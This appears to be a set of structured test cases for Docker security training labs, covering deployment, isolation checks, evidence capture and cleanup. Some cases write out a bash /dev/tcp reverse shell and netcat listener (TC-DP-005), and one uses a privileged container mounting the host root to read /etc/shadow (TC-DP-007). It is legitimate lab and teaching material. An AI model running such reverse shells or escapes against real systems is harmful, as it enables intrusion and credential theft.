# Docker Patterns — Test Cases

> Structured test scenarios for Docker lab setup, operation, evidence extraction, and cleanup.

---

## TC-DP-001: Vulnerable Web App Lab Deployment

### Scenario
Deploy a complete web application security testing lab with DVWA, SQLi-Labs, and Juice Shop for practicing OWASP Top 10 vulnerabilities.

**Severity**: MEDIUM

**Objective**: Validate that vulnerable web application containers can be deployed, verified, and cleanly removed with proper localhost-only network binding and no public exposure.

**Remediation**: If containers bind to 0.0.0.0, modify the run command to explicitly specify 127.0.0.1 before the port mapping. If cleanup fails, run `docker rm -f` on remaining containers. Always verify port bindings with `ss -tlnp` after deployment.

**Pass Criteria**:
- [ ] All 3 containers (dvwa, sqli-labs, juice-shop) running simultaneously
- [ ] All services bound to 127.0.0.1 only (not 0.0.0.0)
- [ ] HTTP 200 response from all three services
- [ ] All containers cleanly removed after stop command

### Pre-conditions
- Docker and Docker Compose installed
- Ports 8080-8082 available on localhost
- At least 4GB RAM available for containers

### Test Steps

1. **Deploy web labs**
   ```bash
   docker run --rm -d --name dvwa -p 127.0.0.1:8080:80 vulnerables/web-dvwa:latest
   docker run --rm -d --name sqli-labs -p 127.0.0.1:8081:80 acgpiano/sqli-labs:latest
   docker run --rm -d --name juice-shop -p 127.0.0.1:8082:3000 bkimminich/juice-shop:latest
   ```

2. **Verify all containers running**
   ```bash
   docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"
   ```

3. **Verify localhost-only binding**
   ```bash
   ss -tlnp | grep -E ":(8080|8081|8082) "
   # Expected: all bound to 127.0.0.1, not 0.0.0.0
   ```

4. **Test accessibility**
   ```bash
   curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:8080  # DVWA
   curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:8081  # SQLi-Labs
   curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:8082  # Juice Shop
   ```

5. **Cleanup**
   ```bash
   docker stop dvwa sqli-labs juice-shop
   ```

### Expected Outcomes

| Metric | Expected |
|--------|----------|
| Containers running | 3 (dvwa, sqli-labs, juice-shop) |
| Binding | 127.0.0.1 only (not 0.0.0.0) |
| HTTP status | 200 for all three |
| Cleanup | All containers removed after stop |

---

## TC-DP-002: Multi-Stage Attack Chain Lab

### Scenario
Deploy a multi-network lab simulating DMZ → Internal → Database attack chain for practicing lateral movement.

**Severity**: HIGH

**Objective**: Validate that a multi-network Docker Compose lab correctly isolates internal services from the DMZ, prevents unauthorized lateral movement from the attacker container, and allows full cleanup of containers, volumes, and images.

**Remediation**: If internal services are reachable from the attacker container, review the Docker Compose network definitions and ensure internal services are only attached to the internal network. If cleanup leaves orphaned volumes, use `docker volume prune` after `docker compose down`. Verify network removal with `docker network ls`.

**Pass Criteria**:
- [ ] All 4 services running (web-frontend, web-api, database, admin-panel)
- [ ] Internal network correctly isolated (attacker cannot reach admin-panel or database directly)
- [ ] DMZ accessible from attacker container
- [ ] Evidence logs extracted before cleanup
- [ ] All containers, volumes, and images removed after cleanup

### Pre-conditions
- Docker Compose available
- Docker networks 172.29.0.0/16 and 172.30.0.0/16 available
- Lab compose file from SKILL.md Pattern 3 available

### Test Steps

1. **Deploy attack chain lab**
   ```bash
   docker compose -f docker-compose.attack-chain.yml up -d
   ```

2. **Verify network isolation**
   ```bash
   # Internal network should be isolated
   docker network inspect attack-chain_internal | jq '.[].Internal'
   # Expected: true
   ```

3. **Test lateral movement path**
   ```bash
   # From attacker container, verify connectivity
   docker exec attacker bash -c "curl -s http://web-frontend"     # Should work (DMZ)
   docker exec attacker bash -c "curl -s http://admin-panel"       # Should fail (internal only)
   ```

4. **Verify database isolation**
   ```bash
   docker exec attacker bash -c "nc -zv database 3306" 2>&1
   # Expected: connection refused (not on same network)
   ```

5. **Extract evidence**
   ```bash
   docker compose -f docker-compose.attack-chain.yml logs > evidence/attack-chain-logs.txt
   ```

6. **Full cleanup**
   ```bash
   docker compose -f docker-compose.attack-chain.yml down -v --rmi local
   ```

### Expected Outcomes

| Metric | Expected |
|--------|----------|
| Services running | 4 (web-frontend, web-api, database, admin-panel) |
| Network isolation | Internal network isolated, DMZ accessible |
| Lateral movement | Blocked from attacker to internal services |
| Cleanup | All containers, volumes, and images removed |

---

## TC-DP-003: Evidence Extraction Workflow

### Scenario
During a lab exercise, capture complete evidence from running containers including logs, filesystem state, and network traffic.

**Severity**: MEDIUM

**Objective**: Validate that a comprehensive evidence extraction workflow captures container state, logs, inspect data, and filesystem diffs for all running containers, producing a complete forensic record.

**Remediation**: If evidence files are empty, verify the containers are still running during extraction (not stopped or restarting). If permissions prevent writing to the evidence directory, adjust ownership or use sudo. Ensure evidence capture is performed before any cleanup operations.

**Pass Criteria**:
- [ ] Per-container evidence files created (logs, inspect.json, diff.txt)
- [ ] containers.txt documents all running containers at time of capture
- [ ] All evidence files are non-empty
- [ ] All captures completed within the same time window

### Pre-conditions
- Lab containers running (from TC-DP-001 or TC-DP-002)
- Evidence directory created
- tcpdump available on host

### Test Steps

1. **Capture container state**
   ```bash
   mkdir -p evidence
   docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Status}}\t{{.Ports}}" > evidence/containers.txt
   ```

2. **Capture container logs**
   ```bash
   for container in $(docker ps --format "{{.Names}}"); do
     docker logs "$container" 2>&1 > "evidence/${container}-logs.txt"
   done
   ```

3. **Capture container inspect data**
   ```bash
   for container in $(docker ps --format "{{.Names}}"); do
     docker inspect "$container" > "evidence/${container}-inspect.json"
   done
   ```

4. **Capture filesystem diff**
   ```bash
   for container in $(docker ps --format "{{.Names}}"); do
     docker diff "$container" > "evidence/${container}-diff.txt"
   done
   ```

5. **Verify evidence completeness**
   ```bash
   ls -la evidence/
   # Expected: containers.txt + per-container logs, inspect, diff files
   ```

### Expected Outcomes

| Metric | Expected |
|--------|----------|
| Evidence files | Per-container: logs, inspect.json, diff.txt |
| Containers.txt | All running containers documented |
| File completeness | All files non-empty |
| Timestamps | All captures within same time window |

---

## TC-DP-004: Safety and Cleanup Verification

### Scenario
Verify that Docker lab environments are properly isolated, no services are exposed publicly, and cleanup removes all artifacts.

**Severity**: HIGH

**Objective**: Validate that Docker lab environments maintain proper network isolation (localhost-only binding), no services are exposed to the public network, and complete cleanup removes all containers, networks, and dangling images.

**Remediation**: If public bindings are detected, stop the offending containers immediately and redeploy with 127.0.0.1 explicit binding. If cleanup is incomplete, run `docker system prune -a --volumes` as a last resort (warning: removes all unused Docker resources). Implement a pre-flight check script that validates bindings before any testing begins.

**Pass Criteria**:
- [ ] No public bindings detected (all ports on 127.0.0.1)
- [ ] No network overlap between lab and host networks
- [ ] Zero containers remaining after cleanup
- [ ] No lab ports listening after cleanup

### Pre-conditions
- One or more lab containers running
- Docker system relatively clean (no unrelated containers)

### Test Steps

1. **Verify localhost-only binding**
   ```bash
   docker ps --format "{{.Ports}}" | grep -v "127.0.0.1"
   # Expected: empty output (all bound to 127.0.0.1)
   ```

2. **Verify network isolation**
   ```bash
   docker network ls --format "{{.Name}}"
   docker network inspect bridge | jq '.[].IPAM.Config[0].Subnet'
   ```

3. **Perform full cleanup**
   ```bash
   docker stop $(docker ps -q) 2>/dev/null
   docker rm $(docker ps -aq) 2>/dev/null
   docker network prune -f
   docker image prune -f
   ```

4. **Verify clean state**
   ```bash
   docker ps -a  # Expected: no containers
   docker network ls  # Expected: only default networks
   ss -tlnp | grep -E ":(808[0-9]|809[0-9])"  # Expected: empty
   ```

### Expected Outcomes

| Metric | Expected |
|--------|----------|
| Public bindings | None (all 127.0.0.1) |
| Network overlap | None (lab subnets don't conflict) |
| Post-cleanup containers | Zero |
| Post-cleanup ports | None listening on lab ports |

---

## TC-DP-005: Reverse Shell Container Lab

### Scenario
Deploy a controlled environment for practicing reverse shell techniques, with a listener container and a target container simulating a vulnerable web service.

**Severity**: HIGH

**Objective**: Validate deployment of a two-container lab for reverse shell practice, ensuring the listener captures connections only from the lab network and all artifacts are cleaned up after the exercise.

**Remediation**: If the reverse shell fails to connect, verify the listener is bound to the Docker network IP (not localhost). If the target container exposes ports publicly, reconfigure with internal-only networking. Always clean up listener and target containers after practice.

**Pass Criteria**:
- [ ] Listener container running on internal Docker network only
- [ ] Target container simulating vulnerable service
- [ ] Reverse shell connection successfully captured
- [ ] No ports exposed to host network
- [ ] Both containers cleaned up after exercise

### Pre-conditions
- Docker installed and running
- Docker network `lab_net` created (172.31.0.0/16)
- Netcat or socat available in listener image
- Kali Linux or Parrot container image available

### Test Steps

1. **Create isolated lab network**
   ```bash
   docker network create --subnet=172.31.0.0/16 lab_net
   ```

2. **Deploy listener container**
   ```bash
   docker run --rm -d --name listener --network lab_net \
     -p 127.0.0.1:4444:4444 \
     kalilinux/kali-rolling:latest \
     bash -c "nc -lvnp 4444"
   ```

3. **Deploy target container**
   ```bash
   docker run --rm -d --name target --network lab_net \
     -p 127.0.0.1:8083:80 \
     vulnerables/web-dvwa:latest
   ```

4. **Execute reverse shell from target to listener**
   ```bash
   docker exec target bash -c "bash -i >& /dev/tcp/172.31.0.2/4444 0>&1"
   ```

5. **Verify connection on listener**
   ```bash
   docker logs listener
   ```

6. **Cleanup**
   ```bash
   docker stop listener target
   docker network rm lab_net
   ```

### Expected Outcomes

| Metric | Expected |
|--------|----------|
| Network | Isolated lab_net created (172.31.0.0/16) |
| Listener | Running on 4444, internal network only |
| Target | Running with DVWA accessible on 127.0.0.1:8083 |
| Reverse shell | Connection received on listener |
| Cleanup | Containers and network removed |

---

## TC-DP-006: Docker Registry Security Lab

### Scenario
Deploy a private Docker registry with misconfigurations for practicing registry enumeration and image extraction attacks.

**Severity**: MEDIUM

**Objective**: Validate deployment of an insecure Docker registry for security testing, ensuring the registry is accessible only from localhost and can be enumerated for sensitive image data.

**Remediation**: If the registry is accessible externally, stop immediately and reconfigure with TLS and authentication. After testing, purge all pushed images and remove the registry container. In production, always enable authentication, TLS, and image signing.

**Pass Criteria**:
- [ ] Registry container running on localhost:5000
- [ ] API v2 catalog endpoint accessible
- [ ] At least one test image pushed and pullable
- [ ] Registry API enumeration demonstrated
- [ ] Registry and all images cleaned up after test

### Pre-conditions
- Docker installed
- Port 5000 available on localhost
- Test images available (alpine, nginx)
- curl or httpie installed

### Test Steps

1. **Deploy insecure registry**
   ```bash
   docker run --rm -d --name registry \
     -p 127.0.0.1:5000:5000 \
     -e REGISTRY_STORAGE_DELETE_ENABLED=true \
     registry:2
   ```

2. **Push a test image**
   ```bash
   docker pull alpine:latest
   docker tag alpine:latest 127.0.0.1:5000/alpine:latest
   docker push 127.0.0.1:5000/alpine:latest
   ```

3. **Enumerate registry via API**
   ```bash
   curl -s http://127.0.0.1:5000/v2/_catalog
   curl -s http://127.0.0.1:5000/v2/alpine/tags/list
   ```

4. **Extract image manifest**
   ```bash
   curl -s http://127.0.0.1:5000/v2/alpine/manifests/latest
   ```

5. **Cleanup**
   ```bash
   docker stop registry
   docker rmi 127.0.0.1:5000/alpine:latest
   ```

### Expected Outcomes

| Metric | Expected |
|--------|----------|
| Registry running | Accessible on 127.0.0.1:5000 |
| Catalog | Returns `{"repositories":["alpine"]}` |
| Tags | Returns tag list for alpine image |
| Manifest | Full image manifest retrieved |
| Cleanup | Registry and test images removed |

---

## TC-DP-007: Privileged Container Escape Lab

### Scenario
Deploy a deliberately privileged container to practice detecting and exploiting privileged container misconfigurations for container escape.

**Severity**: CRITICAL

**Objective**: Validate that a privileged container can be identified, its escape vectors demonstrated (e.g., mounting host filesystem), and the lab safely cleaned up with no residual access to host resources.

**Remediation**: After testing, never deploy privileged containers in production. Use `--cap-drop=ALL` with `--cap-add` for only required capabilities. Enable user namespaces and seccomp profiles. Report privileged container usage as a CRITICAL finding in assessments.

**Pass Criteria**:
- [ ] Privileged container detected via `cat /proc/1/status | grep Cap`
- [ ] Host filesystem mountable from within container
- [ ] Container capabilities documented (full vs restricted)
- [ ] All mount points unmounted before cleanup
- [ ] Container and volumes removed after test

### Pre-conditions
- Docker installed on Linux host (not Docker Desktop)
- Understanding of Linux capabilities
- Lab host (not production)
- Root access to Docker daemon

### Test Steps

1. **Deploy privileged container**
   ```bash
   docker run --rm -it --name priv-test \
     --privileged \
     -v /:/hostfs \
     ubuntu:latest bash
   ```

2. **Detect privileged status**
   ```bash
   cat /proc/1/status | grep Cap
   capsh --print 2>/dev/null || cat /proc/self/status | grep Cap
   ```

3. **Verify host filesystem access**
   ```bash
   ls /hostfs/etc/shadow
   cat /hostfs/etc/hostname
   ```

4. **Document capabilities**
   ```bash
   cat /proc/self/status | grep CapEff
   # Full capabilities = 0000003fffffffff
   ```

5. **Cleanup (from host)**
   ```bash
   docker stop priv-test
   docker system prune -f
   ```

### Expected Outcomes

| Metric | Expected |
|--------|----------|
| Privileged detection | CapEff shows full capabilities |
| Host filesystem | /hostfs/etc/shadow readable |
| Capability dump | All capabilities listed |
| Cleanup | Container removed, no residual mounts |

---

## TC-DP-008: Network Traffic Capture Lab

### Scenario
Deploy a lab with a packet capture container on a shared Docker network to intercept and analyze traffic between application containers.

**Severity**: MEDIUM

**Objective**: Validate that network traffic between containers on a shared Docker network can be captured, analyzed, and used to identify sensitive data in transit.

**Remediation**: If sensitive data is captured in transit, implement TLS between services. Use Docker network encryption (Swarm mode overlay networks) for sensitive deployments. Report cleartext transmission of credentials, tokens, or PII as a finding.

**Pass Criteria**:
- [ ] Packet capture container deployed on shared network
- [ ] Traffic between app containers captured in PCAP file
- [ ] Sensitive data identified in captured traffic
- [ ] PCAP file exported to evidence directory
- [ ] All containers and network cleaned up

### Pre-conditions
- Docker installed
- tcpdump or tshark available in capture image
- Two application containers that communicate over HTTP
- Evidence directory for PCAP storage

### Test Steps

1. **Create shared network**
   ```bash
   docker network create capture_net
   ```

2. **Deploy capture container**
   ```bash
   docker run --rm -d --name capture \
     --network capture_net \
     -v $(pwd)/evidence:/evidence \
     kalilinux/kali-rolling:latest \
     bash -c "apt-get update && apt-get install -y tcpdump && tcpdump -i any -w /evidence/capture.pcap"
   ```

3. **Deploy and generate traffic**
   ```bash
   docker run --rm -d --name web-app --network capture_net nginx:latest
   docker run --rm --name client --network capture_net \
     kalilinux/kali-rolling:latest \
     bash -c "apt-get update && apt-get install -y curl && curl -s http://web-app/"
   ```

4. **Stop and analyze capture**
   ```bash
   docker stop capture
   ls -la evidence/capture.pcap
   tcpdump -r evidence/capture.pcap -A | head -50
   ```

5. **Cleanup**
   ```bash
   docker stop web-app client 2>/dev/null
   docker network rm capture_net
   ```

### Expected Outcomes

| Metric | Expected |
|--------|----------|
| Capture running | tcpdump active on capture container |
| Traffic generated | HTTP request/response captured |
| PCAP exported | evidence/capture.pcap non-empty |
| Analysis | HTTP headers and body visible in capture |
| Cleanup | All containers and network removed |

---

## TC-DP-009: Docker Secrets Management Lab

### Scenario
Deploy a multi-service application using Docker secrets to practice detecting leaked secrets in container environment variables, config files, and layer caches.

**Severity**: HIGH

**Objective**: Validate that secrets leaked through environment variables, Dockerfile layers, or config files can be detected in running containers and that Docker secrets (Swarm mode) provide a more secure alternative.

**Remediation**: Migrate all secrets from environment variables to Docker secrets or an external vault (HashiCorp Vault). Use multi-stage builds to prevent secret leakage in image layers. Scan images with tools like Trivy or docker-scout before deployment.

**Pass Criteria**:
- [ ] Environment variable secrets detected in running container
- [ ] Secrets found in Docker image layer history
- [ ] Docker secrets (Swarm mode) demonstrated as secure alternative
- [ ] All leaked secrets documented with remediation recommendations

### Pre-conditions
- Docker installed (Swarm mode available)
- Understanding of Docker secrets vs environment variables
- Trivy or dockle available for image scanning
- Test application with database password and API keys

### Test Steps

1. **Deploy app with env-based secrets (bad practice)**
   ```bash
   docker run --rm -d --name leaky-app \
     -e DB_PASSWORD="SuperSecret123!" \
     -e API_KEY="sk-abc123def456" \
     nginx:latest
   ```

2. **Detect leaked secrets**
   ```bash
   docker inspect leaky-app | jq '.[].Config.Env'
   docker history nginx:latest --no-trunc
   ```

3. **Scan image for secrets**
   ```bash
   trivy image nginx:latest --scanners secret
   ```

4. **Demonstrate Docker secrets (Swarm)**
   ```bash
   docker swarm init
   echo "SuperSecret123!" | docker secret create db_password -
   docker service create --name secure-app \
     --secret source=db_password,target=db_password \
     nginx:latest
   ```

5. **Verify secret is not in environment**
   ```bash
   docker exec $(docker ps -q --filter name=secure-app) \
     bash -c "env | grep -i password"
   # Expected: empty (secret is a file, not env var)
   ```

6. **Cleanup**
   ```bash
   docker stop leaky-app
   docker service rm secure-app
   docker secret rm db_password
   docker swarm leave --force
   ```

### Expected Outcomes

| Metric | Expected |
|--------|----------|
| Env leak | DB_PASSWORD and API_KEY visible in inspect |
| Image scan | Trivy reports secret findings |
| Docker secrets | Secret mounted as file, not env var |
| Secure comparison | No secrets in environment of secure-app |
| Cleanup | All services, secrets, and Swarm removed |

---

## TC-DP-010: Container Forensics Lab

### Scenario
A compromised container is detected. Deploy a forensic analysis environment to capture memory, filesystem state, and network connections for incident investigation.

**Severity**: MEDIUM

**Objective**: Validate a container forensics workflow that captures volatile data (processes, network connections), filesystem state, and container metadata from a compromised container without destroying evidence.

**Remediation**: If volatile data is lost during capture, ensure the container is not restarted or stopped before forensics are complete. If filesystem diff is empty, the attacker may have used in-memory tools only — check network connections and running processes. Implement container runtime logging for future incident response.

**Pass Criteria**:
- [ ] Running processes captured from compromised container
- [ ] Network connections documented (established and listening)
- [ ] Filesystem diff captured (modified/added/deleted files)
- [ ] Container inspect data exported with full metadata
- [ ] All forensic data saved to evidence directory
- [ ] Container preserved (not stopped) during forensics

### Pre-conditions
- Docker installed
- Suspicious container running (simulated compromise)
- Evidence directory created
- jq available for JSON processing
- tcpdump or netstat available

### Test Steps

1. **Deploy simulated compromised container**
   ```bash
   docker run --rm -d --name compromised \
     -p 127.0.0.1:9999:80 \
     ubuntu:latest \
     bash -c "apt-get update && apt-get install -y netcat-openbsd && nc -lvnp 9999 & while true; do sleep 60; done"
   ```

2. **Capture running processes**
   ```bash
   docker exec compromised ps aux > evidence/compromised_processes.txt
   ```

3. **Capture network connections**
   ```bash
   docker exec compromised netstat -tulnp > evidence/compromised_network.txt
   ```

4. **Capture filesystem changes**
   ```bash
   docker diff compromised > evidence/compromised_fsdiff.txt
   ```

5. **Export container metadata**
   ```bash
   docker inspect compromised > evidence/compromised_inspect.json
   ```

6. **Capture container logs**
   ```bash
   docker logs compromised > evidence/compromised_logs.txt 2>&1
   ```

7. **Verify forensic completeness**
   ```bash
   ls -la evidence/compromised_*
   ```

### Expected Outcomes

| Metric | Expected |
|--------|----------|
| Processes | nc listener and shell processes documented |
| Network | Port 9999 listening documented |
| Filesystem diff | Added/modified files from base image listed |
| Metadata | Full container config, network, and volume data |
| Logs | Container stdout/stderr captured |
| Evidence integrity | All 5 forensic files non-empty |
